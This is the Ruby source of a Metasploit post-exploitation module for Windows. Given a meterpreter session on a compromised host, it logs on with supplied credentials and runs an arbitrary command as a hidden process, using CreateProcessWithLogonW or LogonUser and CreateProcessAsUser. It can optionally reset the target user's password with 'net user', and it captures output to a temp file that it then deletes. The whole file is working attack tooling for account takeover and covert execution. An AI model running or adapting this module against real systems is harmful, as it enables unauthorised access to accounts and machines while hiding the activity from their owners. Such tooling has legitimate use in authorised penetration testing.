##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Priv

  def initialize(info={})
    super(update_info(info,
      'Name'                 => "Windows Manage Run Command As User",
      'Description'          => %q{
        This module will login with the specified username/password and execute the
        supplied command as a hidden process. Output is not returned by default, by setting
        CMDOUT to false output will be redirected to a temp file and read back in to
        display.By setting advanced option SETPASS to true, it will reset the users
        password and then execute the command.
      },
      'License'              => MSF_LICENSE,
      'Platform'             => ['win'],
      'SessionTypes'         => ['meterpreter'],
      'Author'               => ['Kx499']
    ))

    register_options(
      [
        OptString.new('USER', [true, 'Username to reset/login with' ]),
        OptString.new('PASS', [true, 'Password to use' ]),
        OptString.new('CMD', [true, 'Command to execute' ]),
        OptBool.new('CMDOUT', [false, 'Retrieve command output', false]),
      ], self.class)

    register_advanced_options(
      [
        OptBool.new('SETPASS', [false, 'Reset password', false])
      ], self.class)
  end

  # Check if sufficient privileges are present for certain actions and run getprivs for system
  # If you elevated privs to system,the SeAssignPrimaryTokenPrivilege will not be assigned. You
  # need to migrate to a process that is running as
  # system. If you don't have privs, this exits script.

  def priv_check
    if is_system?
      privs = session.sys.config.getprivs
      if privs.include?("SeAssignPrimaryTokenPrivilege") and privs.include?("SeIncreaseQuotaPrivilege")
        @isadmin = false
        return true
      else
        return false
      end
    elsif is_admin?
      @isadmin = true
      return true
    else
      return false
    end
  end

  def reset_pass(user,pass)
    begin
      tmpout = ""
      cmd = "cmd.exe /c net user " + user + " " + pass
      r = session.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
      while(d = r.channel.read)
        tmpout << d
        break if d == ""
      end
      r.channel.close
      return true if tmpout.include?("successfully")
      return false
    rescue
      return false
    end
  end

  def run
    # set some instance vars
    @IsAdmin = false
    @host_info = session.sys.config.sysinfo

    # Make sure we meet the requirements before running the script, note no need to return
    # unless error
    return 0 if session.type != "meterpreter"

    # check/set vars
    setpass = datastore["SETPASS"]
    cmdout = datastore["CMDOUT"]
    user = datastore["USER"] || nil
    pass = datastore["PASS"] || nil
    cmd = datastore["CMD"] || nil
    rg_adv = session.railgun.advapi32

    # reset user pass if setpass is true
    if datastore["SETPASS"]
      print_status("Setting user password")
      if !reset_pass(user,pass)
        print_error("Error resetting password")
        return 0
      end
    end

    # set profile paths
    sysdrive = session.sys.config.getenv('SYSTEMDRIVE')
    os = @host_info['OS']
    profiles_path = sysdrive + "\\Documents and Settings\\"
    profiles_path = sysdrive + "\\Users\\" if os =~ /(Windows 7|2008|Vista)/
    path = profiles_path + user + "\\"
    outpath =  path + "out.txt"

    # this is start info struct for a hidden process last two params are std out and in.
    #for hidden startinfo[12] = 1 = STARTF_USESHOWWINDOW and startinfo[13] = 0 = SW_HIDE
    startinfo = [0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0]
    startinfo = startinfo.pack("LLLLLLLLLLLLSSLLLL")

    #set command string based on cmdout vars
    cmdstr = "cmd.exe /c #{cmd}"
    cmdstr = "cmd.exe /c #{cmd} > #{outpath}" if cmdout
    # Check privs and execute the correct commands
    # if local admin use createprocesswithlogon, if system logonuser and createprocessasuser
    # execute command and get output with a poor mans pipe

    if priv_check
      if @isadmin #local admin
        print_status("Executing CreateProcessWithLogonW...we are Admin")
        cs = rg_adv.CreateProcessWithLogonW(user,nil,pass,"LOGON_WITH_PROFILE",nil, cmdstr,
          "CREATE_UNICODE_ENVIRONMENT",nil,path,startinfo,16)
      else #system with correct token privs enabled
        print_status("Executing CreateProcessAsUserA...we are SYSTEM")
        l = rg_adv.LogonUserA(user,nil,pass, "LOGON32_LOGON_INTERACTIVE",
          "LOGON32_PROVIDER_DEFAULT", 4)
        cs = rg_adv.CreateProcessAsUserA(l["phToken"], nil, cmdstr, nil, nil, false,
          "CREATE_NEW_CONSOLE", nil, nil, startinfo, 16)
      end
    else
      print_error("Insufficient Privileges, either you are not Admin or system or you elevated")
      print_error("privs to system and do not have sufficient privileges. If you elevated to")
      print_error("system, migrate to a process that was started as system (srvhost.exe)")
      return 0
    end

    # Only process file if the process creation was successful, delete when done, give us info
    # about process
    if cs["return"]
      tmpout = ""
      if cmdout
        outfile = session.fs.file.new(outpath, "rb")
        until outfile.eof?
          tmpout << outfile.read
        end
        outfile.close
        c = session.sys.process.execute("cmd.exe /c del #{outpath}", nil, {'Hidden' => true})
        c.close
      end

      pi = cs["lpProcessInformation"].unpack("LLLL")
      print_status("Command Run: #{cmdstr}")
      print_status("Process Handle: #{pi[0]}")
      print_status("Thread Handle: #{pi[1]}")
      print_status("Process Id: #{pi[2]}")
      print_status("Thread Id: #{pi[3]}")
      print_line(tmpout)
    else
      print_error("Oops something went wrong. Error Returned by Windows was #{cs["GetLastError"]}")
      return 0
    end
  end
end
